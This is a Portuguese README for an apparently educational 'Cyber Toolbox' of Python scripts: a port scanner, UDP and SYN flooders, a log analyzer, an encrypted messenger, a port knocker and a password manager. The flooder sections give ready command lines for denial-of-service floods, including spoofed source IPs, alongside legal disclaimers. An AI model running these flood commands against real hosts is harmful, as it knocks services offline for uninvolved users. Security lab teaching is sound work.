# Cyber Toolbox - Guia de Utilização dos Scripts

## Índice
1. [Port Scanner](#port-scanner)
2. [UDP Flooder](#udp-flooder)
3. [SYN Flooder](#syn-flooder)
4. [Log Analyzer](#log-analyzer)
5. [Messenger](#messenger)
6. [Port Knocker](#port-knocker)
7. [Password Manager](#password-manager)

---

## 1. Port Scanner

Varre portas em uma ou múltiplas máquinas remotas para identificar quais estão abertas.

### Uso Básico
```bash
python3 port_scanner.py <alvo1,alvo2,...> <porta_inicial> <porta_final>
```

### Exemplos
```bash
# Escanear um alvo
python3 port_scanner.py 192.168.1.1 1 1024

# Escanear múltiplos alvos
python3 port_scanner.py 192.168.1.1,192.168.1.2,google.com 80 443

# Com argumentos nomeados
python3 port_scanner.py --targets 127.0.0.1 --start-port 1 --end-port 65535

# Com timeout customizado
python3 port_scanner.py 127.0.0.1 1 1024 --timeout 5

# Guardar relatório
python3 port_scanner.py 192.168.1.1 1 1024 --output scan_report.json
```

### Características
- Suporta múltiplos alvos (separados por vírgula)
- Resolução de nomes de hosts
- Identifica serviços associados às portas abertas
- Timeout configurável
- Relatório em JSON (opcional)

### Output
```
60 CYBER-TOOLBOX - PORT SCANNER
============================================================

Varrendo 192.168.1.1 (192.168.1.1) - Portas 1 a 1024
------------------------------------------------------------
Porta 22    aberta (ssh)
Porta 80    aberta (http)
Porta 443   aberta (https)

RELATÓRIO FINAL
============================================================

192.168.1.1 (192.168.1.1)
   Portas abertas: 22, 80, 443

Varrimento concluído em 45.32s
```

---

## 2. UDP Flooder

Envia pacotes UDP para simular um ataque de negação de serviço (DoS).

### Uso Básico
```bash
python3 udp_flooder.py --target <ALVO> [OPTIONS]
```

### Opções
```bash
--target, -t      Alvo (IP ou hostname) [obrigatório]
--port, -p        Porta UDP (default: 53)
--duration, -d    Duração em segundos (default: 10)
--packet-size, -s Tamanho do pacote em bytes (default: 1472)
--threads, -n     Número de threads (default: 4)
```

### Exemplos
```bash
# Flood básico (DNS - porta 53)
python3 udp_flooder.py --target 192.168.1.1

# Flood em porta NTP (123) por 30 segundos
python3 udp_flooder.py --target 192.168.1.1 --port 123 --duration 30

# Flood com 8 threads
python3 udp_flooder.py --target 192.168.1.1 --threads 8

# Flood com pacotes grandes
python3 udp_flooder.py --target 192.168.1.1 --packet-size 65535
```

### AVISO LEGAL
Este script é APENAS para fins educacionais em ambientes autorizados (laboratorial).
O uso não autorizado é ILEGAL e pode violar leis de segurança informática.

---

## 3. SYN Flooder

Envia pacotes TCP SYN para simular um ataque de negação de serviço (SYN Flood/DoS) contra serviços HTTP, SMTP ou outros.

### Requisitos
```bash
# Requer Scapy para manipulação de pacotes raw
pip install scapy

# Requer privilégios de root/administrator
sudo python3 syn_flooder.py --target <ALVO> [OPTIONS]
```

### Uso Básico
```bash
python3 syn_flooder.py --target <ALVO> [OPTIONS]
```

### Opções
```bash
--target, -t    Alvo (IP ou hostname) [obrigatório]
--port, -p      Porta TCP (default: 80/HTTP)
--duration, -d  Duração em segundos (default: 10)
--threads, -n   Número de threads (default: 4)
```

### Exemplos
```bash
# SYN Flood básico contra HTTP (porta 80)
sudo python3 syn_flooder.py --target 192.168.1.1

# SYN Flood contra SMTP (porta 25) por 30 segundos
sudo python3 syn_flooder.py --target 192.168.1.1 --port 25 --duration 30

# SYN Flood com 8 threads
sudo python3 syn_flooder.py --target 192.168.1.1 --port 443 --threads 8

# SYN Flood contra serviço customizado
sudo python3 syn_flooder.py --target 192.168.1.1 --port 3306 --duration 20
```

### O que é um SYN Flood?

Um **SYN Flood** é um ataque DoS que aproveita o protocolo TCP:

1. Atacante envia muitos pacotes TCP SYN (pedidos de conexão) para um servidor
2. Servidor responde com SYN-ACK, aguardando o ACK final do cliente (three-way handshake)
3. Atacante nunca envia o ACK final (ou falsifica IP de origem)
4. Servidor fica com muitas conexões meio-abertas ("half-open")
5. Buffer de conexões pendentes enche, servidor nega novas conexões legítimas

### Características
- Suporta múltiplas threads para intensificar o ataque
- IP de origem aleatório (spoof) em cada pacote
- Portas de origem aleatórias
- Taxa de pacotes por segundo (pps) no relatório
- Duração configurável
- Resolução de nomes de hosts
- Confirmação de segurança antes de execução

### Output
```
Alvo resolvido: 192.168.1.1 -> 192.168.1.1

============================================================
AVISO - SYN FLOOD ATTACK (TCP)
============================================================
Está prestes a enviar um ataque DoS para: 192.168.1.1:80 (http)
Duração: 10s | Threads: 4

AVISOS IMPORTANTES:
  1. Este script requer privilégios de root/administrator
  2. Um ataque SYN Flood pode danificar infraestruturas críticas
  3. O uso não autorizado é ILEGAL em muitas jurisdições
  4. Utilize apenas em ambientes de teste autorizados
------------------------------------------------------------

Confirma que tem autorização? (s/N):

Iniciando SYN Flood (TCP)
   Alvo: 192.168.1.1:80
   Duração: 10 segundos
   Threads: 4
   Protocolo: TCP SYN (Half-Open Connections)
------------------------------------------------------------
  500 pacotes SYN enviados para 192.168.1.1:80
  1000 pacotes SYN enviados para 192.168.1.1:80
  1500 pacotes SYN enviados para 192.168.1.1:80

============================================================
RELATÓRIO - SYN FLOOD
============================================================
Alvo: 192.168.1.1:80
Total de pacotes SYN enviados: 5,234
Taxa de envio: 523 pps (pacotes por segundo)
Duração real: 10.01s
Threads utilizadas: 4
============================================================
```

### AVISO LEGAL
Este script é APENAS para fins educacionais em ambientes autorizados (laboratorial).
Um ataque SYN Flood pode danificar infraestruturas críticas e deixar sistemas inacessíveis.
O uso não autorizado é SEVERAMENTE ILEGAL e pode resultar em penas de prisão.

---

## 4. Log Analyzer

Analisa ficheiros de log (HTTP, SSH, UFW) para extrair informações sobre tentativas de acesso, origem dos acessos e localização geográfica.

### Uso Básico
```bash
python3 log_analyzer.py <ficheiro1.log> [ficheiro2.log ...] [OPTIONS]
```

### Opções
```bash
--geoip-db, -g    Caminho para GeoLite2-Country.mmdb
--outdir, -o      Diretório de output (default: reports/)
```

### Exemplos
```bash
# Analisar ficheiros de log
python3 log_analyzer.py /var/log/apache2/access.log

# Analisar múltiplos ficheiros
python3 log_analyzer.py /var/log/apache2/access.log /var/log/auth.log

# Com resoluação de país
python3 log_analyzer.py /var/log/auth.log --geoip-db /path/to/GeoLite2-City.mmdb

# Especificar diretório de output
python3 log_analyzer.py /var/log/auth.log --outdir ./reports
```

### Formatos Suportados
- **Apache/Nginx Combined Log**: `192.168.1.1 - - [10/Oct/2000:13:55:36 -0700] "GET / HTTP/1.0" 200 1043`
- **SSH Auth Log**: `Oct 10 13:55:36 host sshd[123]: Failed password for invalid user admin from 192.168.1.1 port 53840 ssh2`
- **UFW Firewall Log**: `Oct 10 13:55:36 host UFW BLOCK IN=eth0 OUT= SRC=192.168.1.1 DST=...`

### Output
```
Log Analyzer - Análise de Registos

Ficheiro processado: /var/log/auth.log
156 eventos extraídos

Summary:
Services:
  ssh: 156
Top countries:
  China: 45
  Russia: 32
  United States: 28
  ...

Relatórios guardados:
- auth_report.json
- auth_report.csv
```

### Análise Producida
- **Localização por país** (se GeoLite2 disponível)
- **Origem dos acessos (IPs)**
- **Timestamps de tentativas de acesso**
- **Status de autenticação (sucesso/falha)**
- **Relatórios em JSON e CSV**

---

## 4. Messenger

Serviço seguro de troca de mensagens entre cliente e servidor usando criptografia simétrica e assimétrica.

### Iniciação (Primeira Execução)
```bash
# Gerar chaves RSA
python3 messenger.py init-keys
```

### Servidor
```bash
# Iniciar servidor na porta padrão (9009)
python3 messenger.py serve

# Com host e porta customizada
python3 messenger.py serve --host 0.0.0.0 --port 5555
```

### Cliente - Enviar Mensagem
```bash
python3 messenger.py send \
    --from alice \
    --to bob \
    --message "Olá Bob!" \
    --host 127.0.0.1 \
    --port 9009
```

### Cliente - Listar Mensagens
```bash
python3 messenger.py list --user alice --host 127.0.0.1 --port 9009
```

### Cliente - Descarregar Mensagem
```bash
python3 messenger.py download \
    --user alice \
    --id <message-id> \
    --host 127.0.0.1 \
    --port 9009
```

### Cliente - Apagar Mensagem
```bash
python3 messenger.py delete \
    --user alice \
    --id <message-id> \
    --host 127.0.0.1 \
    --port 9009
```

### Cliente - Backup Simétrico
```bash
python3 messenger.py backup-sym \
    --password minha_senha_secreta \
    --host 127.0.0.1 \
    --port 9009
```

### Cliente - Backup Assimétrico
```bash
python3 messenger.py backup-asym --host 127.0.0.1 --port 9009
```

### Características Principais
- Mensagens encriptadas com criptografia híbrida (Fernet + RSA)
- Suporte a múltiplos utilizadores
- Arquivo de mensagens no servidor
- Backup com encriptação simétrica (com senha) ou assimétrica (com chave pública)
- Descarga seletiva de mensagens
- Eliminação de mensagens apenas por participantes

---

## 5. Port Knocker

Cliente para "port knocking" - técnica de abertura de porta SSH através de uma sequência de pacotes UDP.

### Uso Básico
```bash
python3 port_knocker.py <host> <porta1> [porta2] [porta3] ...
```

### Exemplos
```bash
# Sequência de knocking simples
python3 port_knocker.py 192.168.1.100 7000 8000 9000

# Com hostname
python3 port_knocker.py exemplo.com 1000 2000 3000 4000

# Uma única porta
python3 port_knocker.py 192.168.1.100 5555
```

### Configuração da Máquina Alvo (Linux)

Instale um serviço de port knocking no servidor. Exemplo com `knockd`:

```bash
# Instalar knockd
sudo apt-get install knockd

# Configurar /etc/knockd.conf
[options]
    logfile = /var/log/knockd.log

[openSSH]
    sequence = 7000,8000,9000
    seq_timeout = 15
    command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags = syn

[closeSSH]
    sequence = 9000,8000,7000
    seq_timeout = 15
    command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags = syn
```

### Fluxo Típico
1. Servidor tem SSH bloqueado na firewall
2. Cliente executa: `python3 port_knocker.py servidor.com 7000 8000 9000`
3. Servidor detecta a sequência de pacotes
4. Servidor abre porta 22 (SSH) para o IP do cliente
5. Cliente pode agora fazer SSH normalmente

---

## 6. Password Manager

Gestor de passwords simples com encriptação RSA + Fernet e autenticação de 2 fatores (TOTP).

### Iniciação (Primeira Execução)
```bash
python3 password_manager.py --init
```

Isto irá:
- Gerar par de chaves RSA
- Gerar segredo TOTP e URI de provisioning
- Criar base de dados vazia

**IMPORTANTE**: Adicione o segredo TOTP à sua app autenticadora (Google Authenticator, Authy, Microsoft Authenticator, etc.)

### Criar Registo
```bash
python3 password_manager.py \
    --create \
    --url example.com \
    --user admin \
    --pass senha123
```

### Listar Registos (Requer 2FA)
```bash
python3 password_manager.py --list --otp 123456
```

### Visualizar um Registo (Requer 2FA)
```bash
python3 password_manager.py --view <id> --otp 123456
```

### Atualizar Registo (Requer 2FA)
```bash
python3 password_manager.py \
    --update <id> \
    --url novositeexemplo.com \
    --user novo_user \
    --pass nova_senha \
    --otp 123456
```

### Eliminar Registo (Requer 2FA)
```bash
python3 password_manager.py --delete <id> --otp 123456
```

### Modo Interativo
```bash
python3 password_manager.py
```

Isto apresenta um menu interativo para todas as operações.

### Características
- Criptografia assimétrica (RSA) para as chaves
- Criptografia simétrica (Fernet) para os dados
- Autenticação de 2 fatores (TOTP) obrigatória para acesso
- Operações CRUD completas
- Armazenamento seguro de 3 campos: URL, utilizador, password
- Modo interativo ou linha de comando

### Ficheiros Criados
```
private_key.pem       (Chave privada - MANTÉM SECRETO!)
public_key.pem        (Chave pública)
totp_secret.txt       (Segredo TOTP - guarde)
records.json          (Base de dados encriptada de registos)
```

---

## Iniciar via Menu Principal

Todos os scripts podem ser executados através do menu principal:

```bash
python3 menu_launcher.py
```

O menu apresenta:
```
======== MENU PRINCIPAL - CYBER TOOLBOX ========
1 - Port Scanner
2 - UDP Flooder
3 - SYN Flooder
4 - Log Analyzer
5 - Messenger
6 - Port Knocker
7 - Password Manager
0 - Sair
===============================================
```

---

## Dependências

Instale as dependências com:
```bash
pip install -r requirements.txt
```

Ou manualmente:
```bash
pip install geoip2 requests cryptography pyotp
```

---

## Nota de Segurança

Alguns scripts requerem privilégios elevados (root/administrator) devido ao acesso a sockets brutos:

```bash
sudo python3 udp_flooder.py --target 192.168.1.1
sudo python3 menu_launcher.py
```

---

## Ficheiros de Log e Relatórios

- Logs: `src/logs/`
- Relatórios: `reports/`
- Dados do Password Manager: `src/scripts/`
- Dados do Messenger: `src/data/messages/`, `src/data/keys/`, `src/data/backups/`

